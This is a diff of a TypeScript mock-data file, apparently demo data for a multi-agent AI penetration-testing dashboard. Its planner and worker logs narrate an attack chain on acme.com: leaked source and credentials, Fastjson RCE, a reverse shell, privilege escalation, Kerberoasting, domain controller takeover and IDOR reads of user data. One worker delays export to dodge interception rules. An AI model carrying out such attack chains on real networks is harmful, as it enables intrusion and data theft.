@@ -1186,7 +1211,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#12",
-      ts: T("2026-07-25T23:20:00Z"),
+      ts: T("2026-09-29T23:49:16Z"),
     },
     {
       id: "fiDC",
@@ -1195,7 +1220,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 0,
       state: "confirmed",
       origin: "work#13",
-      ts: T("2026-07-26T00:20:00Z"),
+      ts: T("2026-09-30T00:17:51Z"),
     },
 
     // ── Prompt(main agent Injection)──
@@ -1206,7 +1231,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 5,
       state: "consumed",
       origin: "mainagent",
-      ts: T("2026-07-26T03:20:00Z"),
+      ts: T("2026-09-30T01:43:37Z"),
     },
     {
       id: "h2",
@@ -1215,7 +1240,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 6,
       state: "consumed",
       origin: "mainagent",
-      ts: T("2026-07-25T21:20:00Z"),
+      ts: T("2026-09-29T22:52:05Z"),
     },
     {
       id: "h3",
@@ -1224,7 +1249,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
       priority: 6,
       state: "consumed",
       origin: "mainagent",
-      ts: T("2026-07-25T23:10:00Z"),
+      ts: T("2026-09-29T23:44:30Z"),
     },
   ],
   edges: [
@@ -1301,12 +1326,12 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
 // each worker Session with complete tool execution chain(tool_use → tool_result → …→ result).
 export const activity: Activity[] = [
   // planner —— Complete decision-making chain in each round: read the situation → pull worker Output comparison → Judge target → add_intent Send direction
-  // ── No. 0 Round · Target Breakdown and First Intentions(2026-07-24 09:12)──
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "Round 0 · Target Teardown" },
+  // ── No. 0 Round · Target Breakdown and First Intentions(2026-09-29 05:39)──
+  { seq: 1000, worker: "planner", ts: T("2026-09-29T05:39:12Z"), kind: "round", summary: "Round 0 · Target Teardown" },
   {
     seq: 1001,
     worker: "planner",
-    ts: T("2026-07-24T09:12:25Z"),
+    ts: T("2026-09-29T05:39:19Z"),
     kind: "thinking",
     summary:
       "graph_overview: goals have been split by the target layer - g1 \"obtain acme.com background management permissions\", g2 \"read user sensitive data\", both open; facts=0, recent_facts is empty (the graph is basically blank, and there is no worker output yet). The only assets in scope are the root domain acme.com + a C segment. Initial assessment of the attack surface: www/admin/api/shop/vpn five entrances. There are no facts in the picture. I can only do [extremely lightweight read-only detection] to specify the initial intention, and never do the work in the plan.",
@@ -1314,7 +1339,7 @@ export const activity: Activity[] = [
   {
     seq: 1002,
     worker: "planner",
-    ts: T("2026-07-24T09:12:40Z"),
+    ts: T("2026-09-29T05:39:26Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "p0-probe",
@@ -1324,7 +1349,7 @@ export const activity: Activity[] = [
   {
     seq: 1003,
     worker: "planner",
-    ts: T("2026-07-24T09:12:52Z"),
+    ts: T("2026-09-29T05:39:32Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "p0-probe",
@@ -1335,7 +1360,7 @@ export const activity: Activity[] = [
   {
     seq: 1004,
     worker: "planner",
-    ts: T("2026-07-24T09:13:00Z"),
+    ts: T("2026-09-29T05:39:36Z"),
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p0-ai",
@@ -1346,7 +1371,7 @@ export const activity: Activity[] = [
   {
     seq: 1005,
     worker: "planner",
-    ts: T("2026-07-24T09:13:02Z"),
+    ts: T("2026-09-29T05:39:37Z"),
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p0-ai",
@@ -1356,18 +1381,18 @@ export const activity: Activity[] = [
   {
     seq: 1006,
     worker: "planner",
-    ts: T("2026-07-24T09:13:05Z"),
+    ts: T("2026-09-29T05:39:38Z"),
     kind: "text",
     summary:
       "The first batch of 4 intentions were derived in this round: i1 asset reconnaissance, i2 background password, i4 injection, and i5 API override. g1 goes to i2, g2 goes to i4/i5, and each of the two goals has an independent entrance to advance. Wait for the worker to produce the facts and then increase the weight based on blood.",
   },
 
-  // ── No. 1 round · Increased attack surface(2026-07-25 14:12)──
-  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "Round 1 · Increased attack surface" },
+  // ── No. 1 round · Increased attack surface(2026-09-29 19:28)──
+  { seq: 1100, worker: "planner", ts: T("2026-09-29T19:28:10Z"), kind: "round", summary: "Round 1 · Increased attack surface" },
   {
     seq: 1101,
     worker: "planner",
-    ts: T("2026-07-25T14:12:15Z"),
+    ts: T("2026-09-29T19:28:17Z"),
     kind: "thinking",
     summary:
       "Compare recent_facts: workG handed back faGit \".git can be downloaded, git-dumper restores the back-end source code\" and faCreds \"config.php hard-coded sa/Acme@2021 (suspected to be common on the intranet)\"; work#6 fingerprints were handed back to fa3 \"shop hits Fastjson 1.2.24 (there is a known deserialization RCE)\". Two [material new mechanisms]: ① Hard-coded DB passwords may be reused across the intranet; ② Fastjson has a mature RCE approach. This opens an entrance [substantially different] from the existing authentication/injection route - direct RCE breakthrough from shop into the DMZ. First pull faGit details to verify the product.",
@@ -1375,7 +1400,7 @@ export const activity: Activity[] = [
   {
     seq: 1102,
     worker: "planner",
-    ts: T("2026-07-25T14:12:28Z"),
+    ts: T("2026-09-29T19:28:23Z"),
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
@@ -1385,7 +1410,7 @@ export const activity: Activity[] = [
   {
     seq: 1103,
     worker: "planner",
-    ts: T("2026-07-25T14:12:35Z"),
+    ts: T("2026-09-29T19:28:26Z"),
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p1-nd",
@@ -1396,7 +1421,7 @@ export const activity: Activity[] = [
   {
     seq: 1104,
     worker: "planner",
-    ts: T("2026-07-25T14:12:50Z"),
+    ts: T("2026-09-29T19:28:34Z"),
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p1-ai",
@@ -1407,7 +1432,7 @@ export const activity: Activity[] = [
   {
     seq: 1105,
     worker: "planner",
-    ts: T("2026-07-25T14:12:52Z"),
+    ts: T("2026-09-29T19:28:35Z"),
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p1-ai",
@@ -1416,24 +1441,24 @@ export const activity: Activity[] = [
   {
     seq: 1106,
     worker: "planner",
-    ts: T("2026-07-25T14:13:00Z"),
+    ts: T("2026-09-29T19:28:38Z"),
     kind: "text",
     summary:
       "Situation upgrade: source code + hard-coded intranet password + Fastjson RCE form a new breakthrough route. The target layer has been asked to register g3 \"break through the DMZ from the external network and establish a foothold on the internal network\" and send i6 (fingerprint/CVE association) and i7 (trigger RCE). The DMZ privilege escalation step relies on the shell, which will be recorded in the to-do list for the next round of dispatch.",
   },
 
-  // ── No. 2 Round · The foothold has been established, transfer to the intranet(2026-07-25 20:25)──
+  // ── No. 2 Round · The foothold has been established, transfer to the intranet(2026-09-29 22:25)──
   {
     seq: 1200,
     worker: "planner",
-    ts: T("2026-07-25T20:25:00Z"),
+    ts: T("2026-09-29T22:25:53Z"),
     kind: "round",
     summary: "Round 2 · The foothold has been established, transfer to the intranet",
   },
   {
     seq: 1201,
     worker: "planner",
-    ts: T("2026-07-25T20:25:18Z"),
+    ts: T("2026-09-29T22:26:02Z"),
     kind: "thinking",
     summary:
       "Compare the bloodline: i7 returns fa4 \"rebound shell www-data@dmz-web01 (10.0.20.15), located in the DMZ segment\"; the privilege escalation chain returns fa5 \"sudo -l hits NOPASSWD python3 → can escalate privileges root\", fa6 \"the second network card of the foothold is directly connected to the intranet 10.10.10.0/24\". The acceptance criteria of g3 (breaking through the DMZ + establishing a foothold) are directly satisfied by fa4+fa6. First verify the intranet reachability of fa6 and then prove_goal.",
@@ -1441,7 +1466,7 @@ export const activity: Activity[] = [
   {
     seq: 1202,
     worker: "planner",
-    ts: T("2026-07-25T20:25:30Z"),
+    ts: T("2026-09-29T22:26:07Z"),
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p2-nd",
@@ -1450,7 +1475,7 @@ export const activity: Activity[] = [
   {
     seq: 1203,
     worker: "planner",
-    ts: T("2026-07-25T20:25:38Z"),
+    ts: T("2026-09-29T22:26:11Z"),
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
@@ -1459,7 +1484,7 @@ export const activity: Activity[] = [
   {
     seq: 1204,
     worker: "planner",
-    ts: T("2026-07-25T20:25:50Z"),
+    ts: T("2026-09-29T22:26:17Z"),
     kind: "tool_use",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
@@ -1470,7 +1495,7 @@ export const activity: Activity[] = [
   {
     seq: 1205,
     worker: "planner",
-    ts: T("2026-07-25T20:25:52Z"),
+    ts: T("2026-09-29T22:26:18Z"),
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
@@ -1479,7 +1504,7 @@ export const activity: Activity[] = [
   {
     seq: 1206,
     worker: "planner",
-    ts: T("2026-07-25T20:26:10Z"),
+    ts: T("2026-09-29T22:26:26Z"),
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
@@ -1490,7 +1515,7 @@ export const activity: Activity[] = [
   {
     seq: 1207,
     worker: "planner",
-    ts: T("2026-07-25T20:26:12Z"),
+    ts: T("2026-09-29T22:26:27Z"),
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p2-ai",
@@ -1499,18 +1524,18 @@ export const activity: Activity[] = [
   {
     seq: 1208,
     worker: "planner",
-    ts: T("2026-07-25T20:26:20Z"),
+    ts: T("2026-09-29T22:26:31Z"),
     kind: "text",
     summary:
       "g3 is achieved, the attack surface is transferred from the external network to the internal network. Please register g4 \"intranet horizontal, capture the internal target domain controller DC01\", send i9 (host discovery) + i10/i11/i12 three parallel horizontal lines. Credential reuse is directly anchored on faCreds - the passwords leaked from the external network source code are fed horizontally to the internal network.",
   },
 
-  // ── No. 3 Round · Target achieved review(2026-07-26 00:25)──
-  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "Round 3 · Target achieved review" },
+  // ── No. 3 Round · Target achieved review(2026-09-30 00:20)──
+  { seq: 1300, worker: "planner", ts: T("2026-09-30T00:20:14Z"), kind: "round", summary: "Round 3 · Target achieved review" },
   {
     seq: 1301,
     worker: "planner",
-    ts: T("2026-07-26T00:25:16Z"),
+    ts: T("2026-09-30T00:20:22Z"),
     kind: "thinking",
     summary:
       "Compare this round of worker output: i9→fa7 \"Intranet survival DC01/FS01/JENKINS\"; i11→fa8 \"Jenkins /script without authentication Groovy\" + fa9 \"Export acme\\svc_deploy plain text password from Jenkins credential library\"; i12→fa10 \"Kerberoast svc_sql TGS, hashcat broken Sql@2020\". svc_deploy belongs to Domain Admins, i13 has used its psexec to take down DC01 and secretsdump. g4 acceptance (getting DC01) should have been achieved, first check the finding evidence chain and then stamp.",
@@ -1518,7 +1543,7 @@ export const activity: Activity[] = [
   {
     seq: 1302,
     worker: "planner",
-    ts: T("2026-07-26T00:25:30Z"),
+    ts: T("2026-09-30T00:20:28Z"),
     kind: "tool_use",
     tool: "list_findings",
     tool_use_id: "p3-lf",
@@ -1527,7 +1552,7 @@ export const activity: Activity[] = [
   {
     seq: 1303,
     worker: "planner",
-    ts: T("2026-07-26T00:25:40Z"),
+    ts: T("2026-09-30T00:20:33Z"),
     kind: "tool_result",
     tool: "list_findings",
     tool_use_id: "p3-lf",
@@ -1537,7 +1562,7 @@ export const activity: Activity[] = [
   {
     seq: 1304,
     worker: "planner",
-    ts: T("2026-07-26T00:25:52Z"),
+    ts: T("2026-09-30T00:20:39Z"),
     kind: "tool_use",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
@@ -1548,7 +1573,7 @@ export const activity: Activity[] = [
   {
     seq: 1305,
     worker: "planner",
-    ts: T("2026-07-26T00:25:54Z"),
+    ts: T("2026-09-30T00:20:40Z"),
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
@@ -1557,24 +1582,24 @@ export const activity: Activity[] = [
   {
     seq: 1306,
     worker: "planner",
-    ts: T("2026-07-26T00:26:10Z"),
+    ts: T("2026-09-30T00:20:47Z"),
     kind: "text",
     summary:
       "g4 ends, the internal and external network links are fully opened (external network RCE → DMZ → internal network → domain control). Compare the uncovered directions one by one: g2 \"reading user sensitive data\" still lacks a finishing touch, but the existing i3 (backend user interface) + i5 (API IDOR) have covered this direction and are all running. There is no [uncovered new direction that is fundamentally different] in this round - 0 new intentions according to the principle of restraint, waiting for i3/i5 to be produced.",
   },
 
-  // ── No. 4 Round · Backstage reached, convergence g2(2026-07-26 03:55)──
+  // ── No. 4 Round · Backstage reached, convergence g2(2026-09-30 02:00)──
   {
     seq: 1400,
     worker: "planner",
-    ts: T("2026-07-26T03:55:00Z"),
+    ts: T("2026-09-30T02:00:17Z"),
     kind: "round",
     summary: "Round 4·Background achieved, convergence g2",
   },
   {
     seq: 1401,
     worker: "planner",
-    ts: T("2026-07-26T03:55:14Z"),
+    ts: T("2026-09-30T02:00:24Z"),
     kind: "thinking",
     summary:
       "Compare recent_facts: work#2 uses Acme@2021 in faCreds to hit the admin backend (i2 done), and the backend management permission is obtained - g1 acceptance is achieved, and prove_goal is stamped first. Then do [quantitative acceptance check]: g2 \"read user sensitive data\" currently only i3/i5 has touched the interface, and the batch data has not been actually obtained. The actual measurement has not reached the standard, [disable] prove_goal, and change the priority to supplement the data acquisition intention.",
@@ -1582,7 +1607,7 @@ export const activity: Activity[] = [
   {
     seq: 1402,
     worker: "planner",
-    ts: T("2026-07-26T03:55:26Z"),
+    ts: T("2026-09-30T02:00:30Z"),
     kind: "tool_use",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
@@ -1593,7 +1618,7 @@ export const activity: Activity[] = [
   {
     seq: 1403,
     worker: "planner",
-    ts: T("2026-07-26T03:55:28Z"),
+    ts: T("2026-09-30T02:00:31Z"),
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
@@ -1602,7 +1627,7 @@ export const activity: Activity[] = [
   {
     seq: 1404,
     worker: "planner",
-    ts: T("2026-07-26T03:55:40Z"),
+    ts: T("2026-09-30T02:00:36Z"),
     kind: "thinking",
     summary:
       "g2 Quantitative verification: The target requirement is \"read user sensitive data\" = actually obtain batch user records. There is no \"successfully exported user data\" entry in the findings in graph_overview. Both i3/i5 are running but the results have not been retrieved - the actual measurement has not reached the standard. It is strictly prohibited to use \"the background has been advanced and is generally achieved\" to mark met in advance and continue to send intentions to make up for the gap.",
@@ -1610,7 +1635,7 @@ export const activity: Activity[] = [
   {
     seq: 1405,
     worker: "planner",
-    ts: T("2026-07-26T03:55:52Z"),
+    ts: T("2026-09-30T02:00:42Z"),
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p4-ai",
@@ -1621,7 +1646,7 @@ export const activity: Activity[] = [
   {
     seq: 1406,
     worker: "planner",
-    ts: T("2026-07-26T03:55:54Z"),
+    ts: T("2026-09-30T02:00:43Z"),
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p4-ai",
@@ -1630,7 +1655,7 @@ export const activity: Activity[] = [
   {
     seq: 1407,
     worker: "planner",
-    ts: T("2026-07-26T03:55:58Z"),
+    ts: T("2026-09-30T02:00:45Z"),
     kind: "text",
     summary:
       "g1 achieved (3 met in 4/4: g1/g3/g4). g2 strictly adheres to quantitative acceptance - just entering the backend does not count, batch user data must be obtained before stamping; i3/i5 has been mentioned as priority 9 and refined into data acquisition intentions, and the entire task can be completed after the worker returns.",
@@ -1641,7 +1666,7 @@ export const activity: Activity[] = [
     seq: 10,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:20:00Z"),
+    ts: T("2026-09-29T05:42:56Z"),
     kind: "thinking",
     summary: "First passively reconnaissance subdomains, and then perform port/service identification on surviving hosts.",
   },
@@ -1649,7 +1674,7 @@ export const activity: Activity[] = [
     seq: 11,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:20:30Z"),
+    ts: T("2026-09-29T05:43:10Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t11",
@@ -1659,7 +1684,7 @@ export const activity: Activity[] = [
     seq: 12,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:22:10Z"),
+    ts: T("2026-09-29T05:43:58Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11",
@@ -1671,7 +1696,7 @@ export const activity: Activity[] = [
     seq: 13,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:23:00Z"),
+    ts: T("2026-09-29T05:44:22Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t12",
@@ -1681,7 +1706,7 @@ export const activity: Activity[] = [
     seq: 14,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:26:40Z"),
+    ts: T("2026-09-29T05:46:07Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t12",
@@ -1692,7 +1717,7 @@ export const activity: Activity[] = [
     seq: 15,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:27:00Z"),
+    ts: T("2026-09-29T05:46:16Z"),
     kind: "tool_use",
     tool: "upsert_asset",
     tool_use_id: "t13",
@@ -1702,7 +1727,7 @@ export const activity: Activity[] = [
     seq: 16,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:27:01Z"),
+    ts: T("2026-09-29T05:46:17Z"),
     kind: "tool_result",
     tool: "upsert_asset",
     tool_use_id: "t13",
@@ -1712,7 +1737,7 @@ export const activity: Activity[] = [
     seq: 17,
     worker: "work#1",
     intent_id: "i1",
-    ts: T("2026-07-24T09:40:00Z"),
+    ts: T("2026-09-29T05:52:28Z"),
     kind: "result",
     summary: "Asset reconnaissance is completed, the backend admin.acme.com is found, and the map is returned.",
     input_tokens: 96000,
@@ -1726,7 +1751,7 @@ export const activity: Activity[] = [
     seq: 20,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:31:00Z"),
+    ts: T("2026-09-30T01:48:51Z"),
     kind: "thinking",
     summary: "The background is Element-UI, and the login interface has no verification code and no rate limit. Try the default password list first, then the dictionary.",
   },
@@ -1734,7 +1759,7 @@ export const activity: Activity[] = [
     seq: 21,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:32:00Z"),
+    ts: T("2026-09-30T01:49:20Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t21",
@@ -1744,7 +1769,7 @@ export const activity: Activity[] = [
     seq: 22,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:32:03Z"),
+    ts: T("2026-09-30T01:49:21Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t21",
@@ -1755,7 +1780,7 @@ export const activity: Activity[] = [
     seq: 23,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:32:30Z"),
+    ts: T("2026-09-30T01:49:34Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t22",
@@ -1765,7 +1790,7 @@ export const activity: Activity[] = [
     seq: 24,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:32:33Z"),
+    ts: T("2026-09-30T01:49:36Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t22",
@@ -1776,7 +1801,7 @@ export const activity: Activity[] = [
     seq: 25,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:33:10Z"),
+    ts: T("2026-09-30T01:49:53Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t23",
@@ -1786,7 +1811,7 @@ export const activity: Activity[] = [
     seq: 26,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:33:12Z"),
+    ts: T("2026-09-30T01:49:54Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t23",
@@ -1797,7 +1822,7 @@ export const activity: Activity[] = [
     seq: 27,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:34:00Z"),
+    ts: T("2026-09-30T01:50:17Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t24",
@@ -1807,7 +1832,7 @@ export const activity: Activity[] = [
     seq: 28,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:34:01Z"),
+    ts: T("2026-09-30T01:50:18Z"),
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t24",
@@ -1817,7 +1842,7 @@ export const activity: Activity[] = [
     seq: 29,
     worker: "work#2",
     intent_id: "i2",
-    ts: T("2026-07-26T03:50:00Z"),
+    ts: T("2026-09-30T01:57:54Z"),
     kind: "result",
     summary: "Backend default password confirmation, goal ① achieved.",
     input_tokens: 72000,
@@ -1831,7 +1856,7 @@ export const activity: Activity[] = [
     seq: 40,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-25T22:01:00Z"),
+    ts: T("2026-09-29T23:11:37Z"),
     kind: "thinking",
     summary: "search?q= Put q into the title of the result page, first manually add single quotes to see the error.",
   },
@@ -1839,7 +1864,7 @@ export const activity: Activity[] = [
     seq: 41,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-25T22:02:00Z"),
+    ts: T("2026-09-29T23:12:06Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t41",
@@ -1849,7 +1874,7 @@ export const activity: Activity[] = [
     seq: 42,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-25T22:02:04Z"),
+    ts: T("2026-09-29T23:12:08Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t41",
@@ -1860,7 +1885,7 @@ export const activity: Activity[] = [
     seq: 43,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-25T22:03:00Z"),
+    ts: T("2026-09-29T23:12:35Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t42",
@@ -1870,7 +1895,7 @@ export const activity: Activity[] = [
     seq: 44,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-26T01:18:00Z"),
+    ts: T("2026-09-30T00:45:29Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t42",
@@ -1882,7 +1907,7 @@ export const activity: Activity[] = [
     seq: 45,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-26T01:19:00Z"),
+    ts: T("2026-09-30T00:45:58Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t43",
@@ -1892,7 +1917,7 @@ export const activity: Activity[] = [
     seq: 46,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-26T01:19:01Z"),
+    ts: T("2026-09-30T00:45:58Z"),
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t43",
@@ -1902,7 +1927,7 @@ export const activity: Activity[] = [
     seq: 47,
     worker: "work#4",
     intent_id: "i4",
-    ts: T("2026-07-26T01:20:00Z"),
+    ts: T("2026-09-30T00:46:26Z"),
     kind: "result",
     summary: "SQL injection confirmation.",
     input_tokens: 118000,
@@ -1916,7 +1941,7 @@ export const activity: Activity[] = [
     seq: 50,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:31:00Z"),
+    ts: T("2026-09-30T01:20:16Z"),
     kind: "thinking",
     summary: "/v1/orders?id= is a numeric auto-incrementing id, a typical IDOR aspect. Get your own order first, then change the ID to see if you can read other people's orders.",
   },
@@ -1924,7 +1949,7 @@ export const activity: Activity[] = [
     seq: 51,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:40:00Z"),
+    ts: T("2026-09-30T01:24:33Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t51",
@@ -1934,7 +1959,7 @@ export const activity: Activity[] = [
     seq: 52,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:40:02Z"),
+    ts: T("2026-09-30T01:24:34Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t51",
@@ -1945,7 +1970,7 @@ export const activity: Activity[] = [
     seq: 53,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:43:00Z"),
+    ts: T("2026-09-30T01:25:59Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t52",
@@ -1955,18 +1980,18 @@ export const activity: Activity[] = [
     seq: 54,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:43:02Z"),
+    ts: T("2026-09-30T01:26:00Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t52",
-    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"138****6021", "address":"Chaoyang District, Beijing ****" }',
+    summary: '{ "order_id":1002, "user_id":77, "amount":1299, "phone":"555-0100", "address":"Example Street" }',
     detail: "Using authority to read other people's orders (including mobile phone number/address), no attribution verification.",
   },
   {
     seq: 55,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:44:00Z"),
+    ts: T("2026-09-30T01:26:28Z"),
     kind: "tool_use",
     tool: "report_finding",
     tool_use_id: "t53",
@@ -1976,7 +2001,7 @@ export const activity: Activity[] = [
     seq: 56,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T02:44:01Z"),
+    ts: T("2026-09-30T01:26:28Z"),
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t53",
@@ -1986,7 +2011,7 @@ export const activity: Activity[] = [
     seq: 57,
     worker: "work#5",
     intent_id: "i5",
-    ts: T("2026-07-26T03:58:10Z"),
+    ts: T("2026-09-30T02:01:48Z"),
     kind: "thinking",
     summary: "Traversing the ID range in batches to evaluate the size of the data that can be exceeded (not exported yet to avoid triggering interception rules).",
   },
@@ -1996,7 +2021,7 @@ export const activity: Activity[] = [
     seq: 60,
     worker: "work#3",
     intent_id: "i3",
-    ts: T("2026-07-26T03:56:00Z"),
+    ts: T("2026-09-30T02:00:46Z"),
     kind: "thinking",
     summary: "There is a background session, enumerate the management interface, and find the entrance that can export sensitive user data in batches (goal ②).",
   },
@@ -2004,7 +2029,7 @@ export const activity: Activity[] = [
     seq: 61,
     worker: "work#3",
     intent_id: "i3",
-    ts: T("2026-07-26T03:57:00Z"),
+    ts: T("2026-09-30T02:01:15Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t61",
@@ -2014,7 +2039,7 @@ export const activity: Activity[] = [
     seq: 62,
     worker: "work#3",
     intent_id: "i3",
-    ts: T("2026-07-26T03:57:02Z"),
+    ts: T("2026-09-30T02:01:15Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t61",
@@ -2025,7 +2050,7 @@ export const activity: Activity[] = [
     seq: 63,
     worker: "work#3",
     intent_id: "i3",
-    ts: T("2026-07-26T03:58:20Z"),
+    ts: T("2026-09-30T02:01:53Z"),
     kind: "thinking",
     summary: "Confirm that there is a batch user data reading entrance; the export action hits the destructive/leakage rule, and has been submitted for interception approval and is waiting for release.",
   },
@@ -2035,7 +2060,7 @@ export const activity: Activity[] = [
     seq: 310,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:26:00Z"),
+    ts: T("2026-09-29T22:26:22Z"),
     kind: "thinking",
     summary: "robots.txt mentioned /.git, first detect whether the directory is downloadable, and if you can get the source code, you can find the injection point and hard-coded key in a white box.",
   },
@@ -2043,7 +2068,7 @@ export const activity: Activity[] = [
     seq: 311,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:27:00Z"),
+    ts: T("2026-09-29T22:26:50Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg1",
@@ -2053,7 +2078,7 @@ export const activity: Activity[] = [
     seq: 312,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:27:02Z"),
+    ts: T("2026-09-29T22:26:51Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg1",
@@ -2064,7 +2089,7 @@ export const activity: Activity[] = [
     seq: 313,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:28:00Z"),
+    ts: T("2026-09-29T22:27:19Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg2",
@@ -2074,7 +2099,7 @@ export const activity: Activity[] = [
     seq: 314,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:30:00Z"),
+    ts: T("2026-09-29T22:28:16Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
@@ -2085,7 +2110,7 @@ export const activity: Activity[] = [
     seq: 315,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:34:00Z"),
+    ts: T("2026-09-29T22:30:10Z"),
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "tg3",
@@ -2095,7 +2120,7 @@ export const activity: Activity[] = [
     seq: 316,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:34:03Z"),
+    ts: T("2026-09-29T22:30:12Z"),
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg3",
@@ -2106,7 +2131,7 @@ export const activity: Activity[] = [
     seq: 317,
     worker: "workG",
     intent_id: "ig",
-    ts: T("2026-07-25T20:36:00Z"),
+    ts: T("2026-09-29T22:31:07Z"),
     kind: "result",
     summary: "Source code leakage + hard-coded DB credentials confirmation, the credentials are included in the image for subsequent intranet reuse.",
     input_tokens: 88000,
@@ -2120,7 +2145,7 @@ export const activity: Activity[] = [
     seq: 320,
     worker: "work#6",
     intent_id: "i6",
-    ts: T("2026-07-25T14:22:00Z"),
+    ts: T("2026-09-29T19:32:56Z"),
     kind: "thinking",
